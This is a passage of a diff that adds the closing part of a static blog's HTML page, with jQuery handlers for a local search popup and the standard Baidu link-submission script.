+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
